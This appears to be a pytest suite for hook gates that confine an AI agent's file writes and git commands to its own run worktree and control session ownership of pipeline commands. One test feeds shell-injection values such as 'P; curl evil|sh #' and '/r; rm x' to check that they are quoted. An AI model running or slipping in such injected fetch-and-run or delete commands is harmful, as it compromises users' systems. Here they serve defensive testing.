"""Tests for the worktree PreToolUse gates: core.worktree_write_gate (§6.1) and
core.run_owner_gate (§4.2 takeover + one-time token).

Methodology: a real temp git repo + a real run worktree (core.run_worktree.create),
a temp workspace holding the run's run.json, and the gates' pure decision functions
(``judge`` / ``_decide``) called in-process; owner liveness is monkeypatched.
Invariants: an owner's writes to the main checkout are denied with the worktree twin
named; other runs' worktrees are off limits; stash / shared refs are denied from a
run worktree; a chat session's ordinary git use in main is untouched; the owner gate
rewrites exactly one simple command with a token and denies compound ones.
"""
from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

from core import run_owner_gate as og, worktree_write_gate as wg
from core import run_worktree as rw


@pytest.fixture(autouse=True)
def _projection_is_the_signed_view(monkeypatch):
    """These tests drive gate / sweeper LOGIC with hand-written run.json files and no
    protected contract. Whether those fields can be trusted is tested separately on
    real signed runs (test_worktree_signed_authority.py); here the projection stands in
    for the signed view."""
    from core import run_worktree as _rw
    monkeypatch.setattr(_rw, "_signed_view", lambda f, d: {
        **d, "id": f.parent.name, "project": f.parents[3].name})


RID, OTHER = "run_own1", "run_other1"


def _v1_args(line: str):
    """Parse an emitted hint with pipeline_v1's real argparse (the command must run)."""
    import shlex as _shlex
    import sys as _sys
    from core.run_protocol import cli_main as pipeline_v1
    toks = _shlex.split(line.strip())
    i = next(n for n, t in enumerate(toks) if t == "pipeline-v1")
    return pipeline_v1.parser().parse_args(toks[i + 1:])

def _g(cwd, *a):
    p = subprocess.run(["git", "-C", str(cwd), *a], capture_output=True, text=True)
    assert p.returncode == 0, p.stderr
    return p.stdout.strip()


@pytest.fixture
def env(tmp_path, monkeypatch):
    tmp = Path(os.path.realpath(tmp_path))
    main = tmp / "src" / "swarmai"
    main.mkdir(parents=True)
    _g(main, "init", "-q", "-b", "main")
    for k, v in (("user.name", "T"), ("user.email", "t@e.com"), ("core.hooksPath", str(tmp))):
        _g(main, "config", k, v)
    (main / "a.py").write_text("a = 1\n")
    _g(main, "add", "-A")
    _g(main, "commit", "-q", "-m", "i")
    monkeypatch.setenv("SWARM_WORKTREE_ROOT", str(tmp / "wt"))
    ws = tmp / "ws"
    monkeypatch.setenv("SWARM_WORKSPACE", str(ws))
    runs = {}
    for rid, sid in ((RID, "s1"), (OTHER, "s9")):
        e = rw.create(rid, "swarmai", main)
        rd = ws / "Projects" / "P" / ".artifacts" / "runs" / rid
        rd.mkdir(parents=True)
        (rd / "run.json").write_text(json.dumps({
            "id": rid, "project": "P", "status": "active", "session_id": sid,
            "worktree_mode": "isolated", "worktrees": [e]}))
        runs[rid] = rd / "run.json"
    own_r = rw.own_isolated_run("s1", ws)
    return {"main": main, "ws": ws, "runs": runs, "own": wg._Own(own_r["id"], own_r["worktrees"]),
            "wt": rw.wt_path(RID, "swarmai"), "other": rw.wt_path(OTHER, "swarmai")}


def _call(tool, cwd="", **ti):
    return {"tool_name": tool, "tool_input": ti, "cwd": cwd}


def _passes(value) -> bool:
    """Allowed, with the hook's token and this session's id handed to the call."""
    if value is None:
        return True
    out = value.get("hookSpecificOutput", {})
    cmd = out.get("updatedInput", {}).get("command", "")
    return out.get("permissionDecision") == "allow" and "SWARM_APP_SESSION_ID=" in cmd


def _denied(v):
    return bool(v) and v.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"


# ── write gate ────────────────────────────────────────────────────────────────
def test_owner_write_to_main_denied_with_twin(env):
    v = wg.judge(_call("Write", file_path=str(env["main"] / "a.py")), env["own"])
    assert _denied(v) and str(env["wt"] / "a.py") in v["hookSpecificOutput"]["permissionDecisionReason"]
    assert wg.judge(_call("Edit", file_path=str(env["wt"] / "a.py")), env["own"]) is None
    assert _denied(wg.judge(_call("NotebookEdit", notebook_path=str(env["main"] / "n.ipynb")),
                            env["own"]))


def test_other_runs_worktree_denied(env):
    assert _denied(wg.judge(_call("Write", file_path=str(env["other"] / "a.py")), env["own"]))


def test_bash_redirect_into_main_denied(env):
    v = wg.judge(_call("Bash", cwd=str(env["wt"]), command=f"echo x > {env['main']}/a.py"),
                 env["own"])
    assert _denied(v)
    assert wg.judge(_call("Bash", cwd=str(env["wt"]), command="echo x > a.py"), env["own"]) is None


@pytest.mark.parametrize("cmd", [
    "git -C {main} add a.py", "cd {main} && git commit -m x", "git --work-tree={main} reset",
])
def test_owner_git_writes_in_main_denied(env, cmd):
    assert _denied(wg.judge(_call("Bash", cwd=str(env["wt"]), command=cmd.format(main=env["main"])),
                            env["own"]))


@pytest.mark.parametrize("cmd", [
    "git stash", "git stash pop", "git update-ref refs/heads/main HEAD",
    "git branch -f main HEAD", "git config core.hooksPath /tmp/x", "git worktree remove ../x",
    "git push . HEAD:main",
])
def test_shared_git_state_denied_inside_any_run_worktree(env, cmd):
    assert _denied(wg.judge(_call("Bash", cwd=str(env["wt"]), command=cmd), None))


@pytest.mark.parametrize("cmd", ["git stash list", "git stash show -p stash@{0}"])
def test_reading_the_stash_is_allowed_inside_a_run_worktree(env, cmd):
    assert not _denied(wg.judge(_call("Bash", cwd=str(env["wt"]), command=cmd), None))


def test_git_stash_in_worktree_via_dash_c_from_main(env):
    assert _denied(wg.judge(_call("Bash", cwd=str(env["main"]),
                                  command=f"git -C {env['wt']} stash pop"), None))


@pytest.mark.parametrize("cmd,deny", [
    ("git branch -D feature", False), ("git tag v1.0", False), ("git stash", False),
    ("git config --get user.name", False), ("git branch -D run/" + OTHER, True),
])
def test_chat_session_in_main_untouched_except_run_branches(env, cmd, deny):
    v = wg.judge(_call("Bash", cwd=str(env["main"]), command=cmd), None)
    assert _denied(v) is deny


def test_own_branch_refs_allowed_in_worktree(env):
    assert wg.judge(_call("Bash", cwd=str(env["wt"]), command=f"git branch -f run/{RID} HEAD"),
                    env["own"]) is None


def test_hardlink_in_worktree_denied(env):
    target = env["wt"] / "a.py"
    target.unlink()
    os.link(env["main"] / "a.py", target)
    assert _denied(wg.judge(_call("Edit", file_path=str(target)), env["own"]))


def test_read_of_main_gets_reminder(env):
    v = wg.judge(_call("Read", file_path=str(env["main"] / "a.py")), env["own"])
    assert v["decision"] == "approve" and str(env["wt"] / "a.py") in v["additionalContext"]


# ── owner gate (v1 only, r6 §5) ─────────────────────────────────────────────
# this backend's own CLI: only its scripts receive a token (B round 1)
CLI = '"$SWARM_BACKEND_BIN" pipeline-v1'
LAND = "land --message x"                       # the token command of a normal landing


def _cmd(sub, rid=RID, extra=""):
    return f"{CLI} {sub} --project P --run-id {rid} {extra}".strip()


@pytest.fixture(autouse=True)
def _no_signed_owner(monkeypatch):
    """A takeover also signs owner_transfer on the real engine (tested in
    test_pipeline_v1_human_loop); these runs have no audit area."""
    from core import pipeline_human
    import json as _json
    # stand-in for the signed owner: these runs have no audit area, so the owner is
    # what run.json says and a takeover rewrites it (the real path: human_loop tests)
    def owner(project, run_id):
        for f in Path(os.environ["SWARM_WORKSPACE"]).glob(f"Projects/*/.artifacts/runs/{run_id}/run.json"):
            return _json.loads(f.read_text()).get("session_id")
        return None
    monkeypatch.setattr(og, "_signed_owner", owner)

    def record(run_id, sid):
        for f in Path(os.environ["SWARM_WORKSPACE"]).glob(f"Projects/*/.artifacts/runs/{run_id}/run.json"):
            f.write_text(_json.dumps({**_json.loads(f.read_text()), "session_id": sid}))
        return True
    monkeypatch.setattr(pipeline_human, "record_owner", record)


def test_the_session_id_is_handed_to_a_single_command(env):
    """S6-3: no token; the hook puts this session's id right before the CLI call."""
    c = _cmd(LAND)
    v = og._decide("s1", c, {"command": c})
    assert v["hookSpecificOutput"]["updatedInput"]["command"] == "SWARM_APP_SESSION_ID=s1 " + c


@pytest.mark.parametrize("c", [
    "cd /x && " + _cmd(LAND),
    "echo hi; " + _cmd(LAND),
    _cmd(LAND) + " --x $(cat f)",
])
def test_a_compound_command_gets_no_session_id_but_is_not_denied(env, c):
    """Not the first simple command: the CLI uses its own environment."""
    assert og._decide("s1", c, {"command": c}) is None


@pytest.mark.parametrize("tail", [" && echo done", " | tail -1", " > /tmp/o.json; cat /tmp/o.json"])
def test_output_plumbing_after_the_command_is_allowed(env, tail):
    """The id goes right before the CLI call; the plumbing after it never sees it."""
    c = _cmd(LAND) + tail
    v = og._decide("s1", c, {"command": c})
    new = v["hookSpecificOutput"]["updatedInput"]["command"]
    assert new == "SWARM_APP_SESSION_ID=s1 " + c


def test_a_quoted_heredoc_write_before_the_command_is_allowed(env):
    head = "cat > /tmp/m.txt <<'EOF'\n{\"t\": \"it's $(not run)\"}\nEOF\n"
    c = head + _cmd(LAND)
    v = og._decide("s1", c, {"command": c})
    assert v["hookSpecificOutput"]["updatedInput"]["command"].startswith(
        head + "SWARM_APP_SESSION_ID=s1 ")


def test_steering_env_on_a_pipeline_command_is_denied(env):
    c = "SWARM_WORKTREE_MODE=off " + _cmd(LAND)
    assert _denied(og._decide("s1", c, {"command": c}))


def test_read_only_command_untouched(env):
    for sub in ("status", "push-status", "events"):
        c = _cmd(sub)
        assert _passes(og._decide("s2", c, {"command": c})), sub
    assert json.loads(env["runs"][RID].read_text())["session_id"] == "s1"


def test_takeover_when_owner_not_live(env, monkeypatch):
    monkeypatch.setattr(og, "_owner_live", lambda sid: False)
    monkeypatch.setattr("core.runtime_hooks.write_session_run_map", lambda *a, **k: None)
    c = _cmd("stage-complete")
    assert _passes(og._decide("s2", c, {"command": c}))
    d = json.loads(env["runs"][RID].read_text())
    assert d["session_id"] == "s2" and d["session_history"][0]["session_id"] == "s1"


def test_takeover_denied_while_owner_live(env, monkeypatch):
    monkeypatch.setattr(og, "_owner_live", lambda sid: True)
    c = _cmd("stage-complete")
    assert _denied(og._decide("s2", c, {"command": c}))
    assert json.loads(env["runs"][RID].read_text())["session_id"] == "s1"


@pytest.mark.parametrize("c", [
    # the script path is only an ARGUMENT of a hookless agent: never gets the token
    f"claude --print --bare -p go python-backend pipeline-v1 land --project P "
    f"--run-id {RID} --message x",
])
def test_script_mentioned_but_not_run_gets_no_token(env, c):
    assert _passes(og._decide("s1", c, {"command": c}))


@pytest.mark.parametrize("extra", [
    f"--run-id {OTHER}",                       # twice: argparse takes the last
    "--proj P",                                # abbreviation
])
def test_ambiguous_options_denied(env, extra):
    c = _cmd("stage-complete", extra=extra)
    assert _denied(og._decide("s1", c, {"command": c}))


def test_owner_gate_denies_name_the_single_form(env):
    c = _cmd("stage-complete", extra=f"--run-id {RID}")
    why = og._decide("s1", c, {"command": c})["hookSpecificOutput"]["permissionDecisionReason"]
    form = why.split("Run instead (the values argparse would have used): ", 1)[1].split("\n")[0]
    calls, single = og.parse_cli_calls(form)
    assert single and calls[0]["run_id"] == RID and not calls[0]["ambiguous"]
    c = "FOO=abc " + _cmd(LAND)
    why = og._decide("s1", c, {"command": c})["hookSpecificOutput"]["permissionDecisionReason"]
    form = why.split("Run instead: ", 1)[1].split("\n")[0]
    assert og.parse_cli_calls(form)[1] and "FOO=" not in form


# ── per-repo isolation of the write gate ───────────────────────────────────────
def _set_run(env, rid=RID, **kv):
    d = json.loads(env["runs"][rid].read_text())
    d.update(kv)
    env["runs"][rid].write_text(json.dumps(d))


def _other_repo(env, name="other"):
    p = env["ws"].parent / "elsewhere" / name
    p.mkdir(parents=True)
    _g(p, "init", "-q", "-b", "main")
    for k, v in (("user.name", "T"), ("user.email", "t@e.com")):
        _g(p, "config", k, v)
    (p / "o.py").write_text("o = 1\n")
    _g(p, "add", "-A")
    _g(p, "commit", "-q", "-m", "i")
    return p


def test_lazy_owner_write_into_unisolated_repo_denied_with_a_new_run(env, monkeypatch):
    monkeypatch.setenv("SWARM_WORKSPACE", str(env["ws"]))
    other = _other_repo(env)
    own = wg._Own(RID, [], project="P")
    v = wg.judge(_call("Write", file_path=str(other / "o.py")), own)
    assert _denied(v)
    why = v["hookSpecificOutput"]["permissionDecisionReason"]
    assert f"--repo {other}" in why
    args = _v1_args(why.split("Run: ", 1)[1].split("\n")[0])
    assert args.command == "create" and args.repo == [str(other)]
    v = wg.judge(_call("Bash", command=f"git -C {other} add o.py"), own)
    assert _denied(v) and " create --project" in v["hookSpecificOutput"]["permissionDecisionReason"]
    v = wg.judge(_call("Bash", command=f"echo x > {other}/new.txt"), own)
    assert _denied(v)


def test_lazy_owner_writes_to_unisolatable_places_allowed(env, monkeypatch):
    monkeypatch.setenv("SWARM_WORKSPACE", str(env["ws"]))
    own = wg._Own(RID, [], project="P")
    plain = env["ws"].parent / "plain"
    plain.mkdir()
    assert wg.judge(_call("Write", file_path=str(plain / "f.txt")), own) is None
    assert wg.judge(_call("Write", file_path=str(env["ws"] / "Projects" / "P" / "x.md")), own) is None
    sub = _other_repo(env, "withsub")
    (sub / ".gitmodules").write_text("")
    assert wg.judge(_call("Write", file_path=str(sub / "o.py")), own) is None


def test_chat_session_without_run_never_denied_in_other_repos(env, monkeypatch):
    monkeypatch.setenv("SWARM_WORKSPACE", str(env["ws"]))
    other = _other_repo(env)
    assert wg.judge(_call("Write", file_path=str(other / "o.py")), None) is None


# ── rule 4: worktree mode on, a session with no run writes the main checkout ─────
def _gate(sid, **ctx):
    import asyncio
    gate = wg.create_worktree_write_gate({"sdk_session_id": sid, **ctx})
    return lambda call: asyncio.run(gate(call, None, None))


@pytest.fixture
def r4(env, monkeypatch):
    monkeypatch.setenv("SWARM_WORKTREE_MODE", "on")
    (env["ws"] / "Projects" / "SwarmAI").mkdir(parents=True)   # the repo's project
    return env


def _run_json(env, rid, sid, **kw):
    rd = env["ws"] / "Projects" / "P" / ".artifacts" / "runs" / rid
    rd.mkdir(parents=True)
    (rd / "run.json").write_text(json.dumps({"id": rid, "project": "P", "session_id": sid, **kw}))


def test_no_run_session_may_write_main_but_not_a_run_worktree(r4):
    """Design 2026-10-24-swarmai-usable-by-anyone §3.4: rule 4 no longer sends main-checkout
    writes to a run; it still keeps a session out of a run's worktree."""
    g = _gate("s5")
    assert not _denied(g(_call("Edit", file_path=str(r4["main"] / "a.py"))))
    assert not _denied(g(_call("Bash", cwd=str(r4["main"]),
                               command=f"sed -i '' 's/a/b/' {r4['main']}/a.py")))
    assert _denied(g(_call("Write", file_path=str(r4["other"] / "a.py"))))   # a run's worktree


def test_no_run_rule_spares_ignored_unbound_scratch_and_shared(r4, tmp_path):
    (r4["main"] / ".gitignore").write_text("build/\n")
    assert not _denied(_gate("s5")(_call("Write", file_path=str(r4["main"] / "build" / "x"))))
    # hook_builder's fallback context (a prewarm): it could never start a run
    assert not _denied(_gate("default", _unbound=True)(_call("Edit", file_path=str(r4["main"] / "a.py"))))
    # a scratch repo no project names
    scratch = Path(os.path.realpath(tmp_path)) / "scratch"
    scratch.mkdir()
    _g(scratch, "init", "-q", "-b", "main")
    _g(scratch, "config", "user.name", "T")
    _g(scratch, "config", "user.email", "t@e.com")
    (scratch / "x.py").write_text("x\n")
    _g(scratch, "add", "-A")
    _g(scratch, "commit", "-q", "-m", "i")
    assert not _denied(_gate("s5")(_call("Edit", file_path=str(scratch / "x.py"))))
    # a session whose own run is shared-mode keeps writing main as before
    _run_json(r4, "run_5ab5ab5a", "s6", status="active", worktree_mode="shared")
    assert not _denied(_gate("s6")(_call("Edit", file_path=str(r4["main"] / "a.py"))))


def test_no_run_rule_is_off_with_the_mode_off(r4, monkeypatch):
    monkeypatch.setenv("SWARM_WORKTREE_MODE", "off")
    for rid in (RID, OTHER):          # no worktree anywhere and mode off: the gate is free
        rw._remove(rid, json.loads(r4["runs"][rid].read_text())["worktrees"][0], r4["main"],
                   merged=False)
    assert not _denied(_gate("s5")(_call("Edit", file_path=str(r4["main"] / "a.py"))))


# ── a denied target that is already uncommitted in main gets the claim route ──────
def _why(v):
    return v["hookSpecificOutput"]["permissionDecisionReason"]


def test_owner_deny_names_claim_only_when_main_file_is_uncommitted(env):
    own = wg._Own(RID, [("swarmai", str(env["wt"]))], project="P")
    clean = _why(wg.judge(_call("Write", file_path=str(env["main"] / "a.py")), own))
    assert str(env["wt"] / "a.py") in clean and "re-apply that change" not in clean
    (env["main"] / "left.txt").write_text("l\n")
    why = _why(wg.judge(_call("Bash", cwd=str(env["main"]),
                              command=f"mv {env['main']}/left.txt /tmp/x"), own))
    assert "re-apply that change" in why


def test_main_edit_note_is_silent_when_git_fails(env, monkeypatch):
    import core.run_worktree as rwm

    def boom(*a, **k):
        raise rwm.WorktreeError("git_failed", "timeout")
    monkeypatch.setattr(rwm, "git", boom)
    (env["main"] / "left.txt").write_text("l\n")
    assert wg._main_edit_note(str(env["main"]), str(env["main"] / "left.txt")) == ""
    assert wg._main_edit_note(str(env["main"]), "/elsewhere/x") == ""


def test_main_edit_note_skips_a_directory_and_a_spent_budget(env, monkeypatch):
    import time as _t
    import core.run_worktree as rwm
    calls = []
    real = rwm.git
    monkeypatch.setattr(rwm, "git", lambda *a, **k: calls.append(k.get("timeout")) or real(*a, **k))
    d = env["main"] / "sub"
    d.mkdir()
    (d / "x.txt").write_text("x\n")
    assert wg._main_edit_note(str(env["main"]), str(d)) == "" and calls == []
    left = env["main"] / "left.txt"
    left.write_text("l\n")
    wg._TL.deadline = _t.monotonic() + wg._NOTE_MARGIN + 0.1   # under 0.2s left
    try:
        assert wg._main_edit_note(str(env["main"]), str(left)) == "" and calls == []
        wg._TL.deadline = _t.monotonic() + 2.0
        note = wg._main_edit_note(str(env["main"]), str(left))
        assert "re-apply that change" in note and "already an uncommitted change" in note
        assert calls and calls[-1] <= 2.0 - wg._NOTE_MARGIN + 0.01
    finally:
        wg._TL.deadline = None


def test_with_deadline_clears_the_thread_local_also_on_error():
    def boom():
        assert wg._TL.deadline == 12.5
        raise RuntimeError("x")
    with pytest.raises(RuntimeError):
        wg._with_deadline(12.5, boom)
    assert wg._TL.deadline is None
    assert wg._with_deadline(1.0, lambda: wg._TL.deadline) == 1.0 and wg._TL.deadline is None


def test_main_edit_note_matches_the_path_literally(env):
    d = env["main"] / "app" / "[id]"
    d.mkdir(parents=True)
    (d / "page.tsx").write_text("x\n")
    _g(env["main"], "add", "-A")
    _g(env["main"], "commit", "-q", "-m", "p")
    (env["main"] / "app" / "i").mkdir()
    (env["main"] / "app" / "i" / "page.tsx").write_text("dirty\n")   # matches app/[id] as a glob
    assert wg._main_edit_note(str(env["main"]), str(d / "page.tsx")) == ""
    assert "re-apply" in wg._main_edit_note(str(env["main"]), str(env["main"] / "app" / "i" / "page.tsx"))


def test_repo_hint_quotes_the_repo_path(env, monkeypatch):
    monkeypatch.setenv("SWARM_WORKSPACE", str(env["ws"]))
    own = wg._Own("run_x", [], project="P; curl evil|sh #")
    why = wg._repo_add_deny(own, "/r; rm x", "f")["hookSpecificOutput"]["permissionDecisionReason"]
    args = _v1_args(why.split("Run: ", 1)[1])
    assert args.project == "P; curl evil|sh #" and args.repo == ["/r; rm x"]


# ── F2 (2026-10-21 stability design): the judgment never waits behind slow writers ──
def test_gate_judges_while_the_slow_writer_pool_is_full(r4):
    """The worktree gate's 3s fail-open timeout counts queueing. On the shared 3-thread
    'subprocess' pool (auto-commit git, backups) it failed open 324 times in a week.
    Fill that pool with sleeping writers: the gate must still deny within a second."""
    import asyncio
    import threading
    import time as _t
    from core import executors

    release = threading.Event()

    async def _run():
        gate = wg.create_worktree_write_gate({"sdk_session_id": "s5"})
        writers = [asyncio.ensure_future(executors.run_in("subprocess", release.wait, 10))
                   for _ in range(executors._POOL_SPECS["subprocess"])]
        await asyncio.sleep(0.05)
        t0 = _t.monotonic()
        v = await gate(_call("Edit", file_path=str(r4["other"] / "a.py")), None, None)
        took = _t.monotonic() - t0
        release.set()
        await asyncio.gather(*writers)
        return v, took

    v, took = asyncio.run(_run())
    assert _denied(v), "the gate failed open while the slow-writer pool was busy"
    assert took < 1.0


